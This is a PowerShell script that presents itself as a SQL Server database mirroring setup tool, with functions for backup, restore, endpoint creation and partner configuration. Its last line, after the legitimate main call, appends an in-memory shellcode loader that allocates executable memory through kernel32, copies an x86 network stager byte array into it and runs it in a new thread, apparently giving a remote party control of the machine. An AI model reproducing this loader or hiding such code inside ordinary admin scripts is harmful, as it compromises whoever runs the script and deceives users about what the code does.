









function BackupDatabase
{
        Param([string]$servername, [string]$dbName, [string]$backupfiledir, [Microsoft.SqlServer.Management.Smo.BackupActionType]$actionType)

       $server = GetServer($servername)

        
        $backupfilepath = $backupfiledir + "\" + $dbName +  "-" + $actionType.ToString() + "-" +[DateTime]::Now.ToString('s').Replace(":","-") + ".bak"
        
        $backup = new-object ('Microsoft.SqlServer.Management.Smo.Backup')
        $backup.Action = $actionType
        $backup.Database = $dbName
        $backup.Devices.AddDevice($backupfilepath, [Microsoft.SqlServer.Management.Smo.DeviceType]::File)

        $backup.SqlBackup($server)

        write-host "Backup completed successfully"
        write-host "Server:",$server.Name
        write-host "Database:$dbName"
        write-host "Backup File:$backupfilepath"
        
        $backupfilepath;
}


function RestoreDatabase
{
        Param([string]$servername, [string]$dbName, [string]$backupDataFile)

        $server = GetServer($servername)
        $targetDBFilePath = $server.MasterDBPath + "\" + $dbName +  "-Data-" + [DateTime]::Now.ToString('s').Replace(":","-") + ".mdf"
        $targetLogFilePath = $server.MasterDBLogPath + "\" + $dbName +  "-Log-" + [DateTime]::Now.ToString('s').Replace(":","-") + ".ldf"

        $restore = new-object ('Microsoft.SqlServer.Management.Smo.Restore')
        $restore.Database = $dbName
        $restore.Devices.AddDevice($backupDataFile, [Microsoft.SqlServer.Management.Smo.DeviceType]::File)

        $relocateDataFile = new-object ('Microsoft.SqlServer.Management.Smo.RelocateFile')($dbName, $targetDBFilePath)

        $logFileName = $dbName + "_Log"
        $relocateLogFile  = new-object ('Microsoft.SqlServer.Management.Smo.RelocateFile')($logFileName, $targetLogFilePath)

        $restore.RelocateFiles.Add($relocateDataFile)
        $restore.RelocateFiles.Add($relocateLogFile)

        $restore.ReplaceDatabase = $True
        $restore.NoRecovery = $True
        $restore.SqlRestore($server)
        
        write-host "Restore completed successfully"
        write-host "Server:", $server.Name
        write-host "Database:$dbName"
}


function CreateDBMirroringEndPoint
{
        Param([string]$servername, [Microsoft.SqlServer.Management.Smo.ServerMirroringRole]$mirroringRole)
        $server = GetServer($servername)
        $tcpPort = GetNextAvailableTCPPort $servername

        $endPointName = "Database_Mirroring_" + [DateTime]::Now.ToString('s').Replace(":","-")
        $endpoint  = new-object ('Microsoft.SqlServer.Management.Smo.EndPoint')($server, $endPointName)
        $endpoint.ProtocolType = [Microsoft.SqlServer.Management.Smo.ProtocolType]::Tcp
        $endpoint.EndpointType = [Microsoft.SqlServer.Management.Smo.EndpointType]::DatabaseMirroring
        $endpoint.Protocol.Tcp.ListenerPort = $tcpPort  
        $endpoint.Payload.DatabaseMirroring.ServerMirroringRole = $mirroringRole
        $endpoint.Create()
        $endpoint.Start()
        
        
        $fullyQualifiedName = "TCP://" + $server.NetName + ":" + $tcpPort       
        $fullyQualifiedName;
}



function GetFullyQualifiedMirroringEndpoint
{
        Param([string]$serverInstance, [Microsoft.SqlServer.Management.Smo.ServerMirroringRole]$mirroringRole)
        $fullyQualifiedMirroringEndPointName = ""
        
        $EndPointList = GetEndPointList $serverInstance

        $server = GetServer $serverInstance
        
        if($EndPointList -eq $null)
        {
                $fullyQualifiedMirroringEndPointName = CreateDBMirroringEndPoint $serverInstance $mirroringRole
        }
        else
        {
                foreach($endPoint in $EndPointList)
                {
                        $fullyQualifiedMirroringEndPointName = "TCP://" + $server.NetName + ":" + $endPoint.Properties["ListenerPort"].Value
                        break
                }
        }
        
        write-host "Server Name:$serverInstance"
        write-host "Mirroring Role:$mirroringRole"
        write-host "EndPointName:$fullyQualifiedMirroringEndPointName"
        $fullyQualifiedMirroringEndPointName;
}


function GetEndPointList
{
        Param([string]$servername)
        $server = GetServer($servername)

        $PSPath = $server.PsPath + "\EndPoints"

        $EndPointList = @()

        
        $AllEndPoints = dir $PSPath
        foreach($endpoint in $AllEndPoints)
        {
                $EndPointList += $endpoint.Protocol.Tcp
        }

        $EndPointList;
}


function GetNextAvailableTCPPort
{
        Param([string]$serverInstance)
        
        $measure = GetEndPointList $serverInstance | measure-object ListenerPort -max

        if($measure.Maximum -eq $null)
        {
                $maxPort = 5000
        }
        else
        {
                $maxPort = $measure.Maximum
        }

        
        $maxPort + (new-object random).Next(1,500)
}



function GetServer
{
        Param([string]$serverInstance)

       $array = $serverInstance.Split("\")

       if([String]::IsNullOrEmpty($serverInstance))
       {
                write-error "Server instance  name is not valid"
                return
       }

       if($array.Length -eq 1)
       {
                $machineName = $array[0]
                $instanceName = "DEFAULT"
       }
       else
       {
                $machineName = $array[0]
                $instanceName = $array[1]
       }

       $PSPath = "\SQL\" + $machineName + "\" + $instanceName


       $server = get-item $PSPath

       CheckForErrors
       $server;
}


function SetRecoveryModel
{
        Param($serverInstance, $dbName, [Microsoft.SqlServer.Management.Smo.RecoveryModel]$recoveryModel)
        
        write-host "Setting", $recoveryModel, "Recovery model for database:", $dbName
        $server = GetServer($serverInstance)

        $PSPath = $server.PsPath + "\Databases\"  + $dbName

        $db = get-item $PSPath
        $db.RecoveryModel = $recoveryModel
        $db.Alter()
        
        write-host "[SetRecoveryModel:] OK"
        CheckForErrors
}



function SetMirroringPartner
{
        Param($serverInstance, $dbName, $fqName, [bool]$isPartner)
        $server = GetServer($serverInstance)

        $PSPath = $server.PsPath + "\Databases\"  + $dbName
        
        $db = get-item $PSPath
        
        if($isPartner -eq $True)
        {
                $db.MirroringPartner = $fqName
        }
        else
        {
                $db.MirroringWitness = $fqName
        }
        
        $db.Alter()
}


function CheckForErrors
{
        $errorsReported = $False
        if($Error.Count -ne 0)
        {
                write-host "******************************"
                write-host "Errors:", $Error.Count
                write-host "******************************"
                foreach($err in $Error)
                {
                        $errorsReported  = $True
                        if( $err.Exception.InnerException -ne $null)
                        {
                                write-host $err.Exception.InnerException.ToString()
                        }
                        else
                        {
                                write-host $err.Exception.ToString()
                        }
                                
                        write-host "----------------------------------------------"
                }
                
                throw
        }
        
}


function PerformValidation
{
        Param($primary , $mirror, $witness, $shareName, $dbName)
        
        $Error.Clear()
        
        write-host "Performing Validation checks..."
        
        $primaryServer = GetServer $primary

        $PSPath = $primaryServer.PsPath + "\Databases\"  + $dbName
       
        $primaryDatabase = get-item $PSPath

        write-host "Checking if Database:$dbName on Primary:$primary is not mirrored..."
        if($primaryDatabase.MirroringStatus -ne [Microsoft.SqlServer.Management.Smo.MirroringStatus]::None)
        {
                $errorMessage = "Cannot setup mirroring on database due to its current MirroringState:" + $primaryDatabase.MirroringStatus
                throw $errorMessage
        }
       
        write-host "[$dbName on Primary:$primary is not mirrored Check:] OK"
        
        if($primaryDatabase.Status -ne [Microsoft.SqlServer.Management.Smo.DatabaseStatus]::Normal)
        {
                $errorMessage = "Cannot setup mirroring on database due to its current Status:" + $primaryDatabase.Status
                throw $errorMessage
        }
        
        write-host "Checking if Database:$dbName does not exist on  Mirror:$mirror..."
        $mirrorServer = GetServer $mirror
        $PSPath = $mirrorServer.PsPath + "\Databases\"
        
        $mirrorDatabase= get-childitem $PSPath | where {$_.Name -eq $dbName}  
        
        if($mirrorDatabase -ne $null)
        {
                $dbMeasures = $mirrorDatabase | measure-object
                if($dbMeasures.Count -ne 0)
                {
                        $errorMessage = "Database:" + $dbName + " already exists on mirror server:" + $mirror
                        throw $errorMessage
                }
        }
       
        write-host "[$dbName does not exist on Mirror:$mirror Check:] OK"
        
        write-host "Checking if Witness Server exists..."
        $witnessServer = GetServer $witness
        write-host "[Witness Server Existence Check:] OK"
       
        write-host "Checking if File Share:$ShareName exists..."
        if([System.IO.Directory]::Exists($shareName) -ne $True)
        {
                $errorMessage = "Share:" + $shareName + " does not exists"
                throw $errorMessage
        }
        
        write-host "[File Share Existence Check:] OK"
       
       
        CheckForErrors
}



function ConfigureDatabaseMirroring
{
        Param([string]$primary = $(Read-Host "Primary SQL Instance(like server\instance)") ,
                [string]$mirror = $(Read-Host "Mirror SQL Instance(like server\instance)") ,
                [string]$witness = $(Read-Host "Witness SQL Instance(like server\instance)") ,
                [string]$shareName = $(Read-Host "Share Path(unc path like \\server\share)") ,
                [string]$dbName = $(Read-Host "Database Name")
                )
        
        write-host
        write-host "============================================================="
        write-host " 1: Performing Initial checks; validating input parameters"
        write-host "============================================================="
        PerformValidation $primary $mirror $witness  $shareName $dbName
        
        write-host
        write-host "============================================================="
        write-host " 2: Set Recovery Model as FULL on primary database"
        write-host "============================================================="
        $fullRecoveryModelType = [Microsoft.SqlServer.Management.Smo.RecoveryModel]::Full
        SetRecoveryModel $primary $dbName $fullRecoveryModelType

        write-host
        write-host "============================================================="
        write-host " 3: Perform Full Database backup from Primary instance"
        write-host "============================================================="
        $backupActionType = [Microsoft.SqlServer.Management.Smo.BackupActionType]::Database
        $primaryBackupDataFile = BackupDatabase $primary $dbName $shareName $backupActionType

        write-host
        write-host "============================================================="
        write-host " 4: Restore Database backup on Mirror"
        write-host "============================================================="
        RestoreDatabase $mirror $dbName $primaryBackupDataFile

        write-host
        write-host "============================================================="
        write-host " 5: Create endpoints for database mirroring"
        write-host "============================================================="

        $mirroringRole = [Microsoft.SqlServer.Management.Smo.ServerMirroringRole]::Partner
        $primaryFQName = GetFullyQualifiedMirroringEndpoint $primary $mirroringRole

        $mirrorFQName = GetFullyQualifiedMirroringEndpoint $mirror $mirroringRole

        $mirroringRole = [Microsoft.SqlServer.Management.Smo.ServerMirroringRole]::Witness
        $witnessFQName = GetFullyQualifiedMirroringEndpoint $witness $mirroringRole

        write-host
        write-host "============================================================="
        write-host "  6: Set Primary, Mirror, Witness states in database"
        write-host "============================================================="
        write-host "Connecting to Mirror and set Primary as partner ..."
        SetMirroringPartner $mirror $dbName $primaryFQName $True

        write-host "Connecting to Primary, set partner as mirror ..."
        SetMirroringPartner $primary $dbName $mirrorFQName   $True
       
        write-host "Connecting to Primary, set partner as witness ..."
        SetMirroringPartner $primary $dbName $witnessFQName   $False
        
        write-host
        write-host "============================================================="
        write-host "  Database:$dbName mirrored successfully."
        write-host "============================================================="
}




ConfigureDatabaseMirroring
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x5e,0x72,0xd5,0x9f,0x68,0x02,0x00,0x01,0xbd,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

